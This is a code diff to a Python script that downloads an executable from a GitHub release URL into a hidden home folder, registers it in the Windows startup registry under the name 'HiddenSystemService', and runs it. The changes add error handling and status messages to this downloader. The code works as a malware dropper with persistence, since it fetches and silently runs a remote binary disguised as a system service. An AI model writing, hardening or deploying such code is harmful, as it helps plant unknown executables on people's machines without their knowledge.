@@ -6,7 +6,7 @@ from pathlib import Path
 import winreg  # For adding to startup
 
 # Hardcoded values
-URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"  # Replace with your URL
+URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"
 FOLDER_NAME = ".hidden_service"
 FILE_NAME = "system_service.exe"
 HASH_FILE_NAME = "file_hash.txt"  # To store the hash of the downloaded file
@@ -16,13 +16,19 @@ def get_user_hidden_folder():
     user_home = Path.home()
     hidden_folder = user_home / FOLDER_NAME
     if not hidden_folder.exists():
-        hidden_folder.mkdir()
+        hidden_folder.mkdir(parents=True, exist_ok=True)
     return hidden_folder
 
 def download_file(url, dest):
     """Download a file from a URL."""
-    with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
-        out_file.write(response.read())
+    try:
+        print(f"Downloading file from {url}...")
+        with urllib.request.urlopen(url) as response, open(dest, 'wb') as out_file:
+            out_file.write(response.read())
+        print(f"File downloaded successfully to {dest}.")
+    except Exception as e:
+        print(f"Error downloading file: {e}")
+        raise
 
 def compute_file_hash(file_path):
     """Compute the SHA256 hash of a file."""
@@ -55,6 +61,7 @@ def add_to_startup(file_path):
         )
         winreg.SetValueEx(key, "HiddenSystemService", 0, winreg.REG_SZ, str(file_path))
         winreg.CloseKey(key)
+        print("Added to startup successfully.")
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
@@ -74,8 +81,12 @@ def ensure_and_run_file():
 
     # Download and check the new file's hash
     new_file_path = hidden_folder / f"new_{FILE_NAME}"
-    download_file(URL, new_file_path)
-    new_file_hash = compute_file_hash(new_file_path)
+    try:
+        download_file(URL, new_file_path)
+        new_file_hash = compute_file_hash(new_file_path)
+    except Exception as e:
+        print(f"Failed to download or hash the file: {e}")
+        return
 
     if saved_hash == new_file_hash:
         # If the hash matches, delete the new file
@@ -93,7 +104,11 @@ def ensure_and_run_file():
         add_to_startup(file_path)
 
     # Run the file
-    subprocess.Popen([str(file_path)], shell=False)
+    try:
+        subprocess.Popen([str(file_path)], shell=False)
+        print("File executed successfully.")
+    except Exception as e:
+        print(f"Failed to execute the file: {e}")
 
 if __name__ == "__main__":
     ensure_and_run_file()
